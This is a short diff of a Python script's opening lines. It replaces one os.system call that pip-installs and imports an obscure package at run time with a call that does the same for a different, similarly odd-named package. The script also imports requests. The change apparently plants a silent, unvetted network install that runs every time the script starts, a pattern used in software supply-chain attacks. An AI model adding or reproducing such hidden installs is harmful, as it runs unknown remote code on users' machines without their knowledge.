@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitedbextV1")
-import pythonsqlitedbextV1
+os.system("pip install pythoncoloraddonV2")
+import pythoncoloraddonV2
 import random
 import requests
 import time
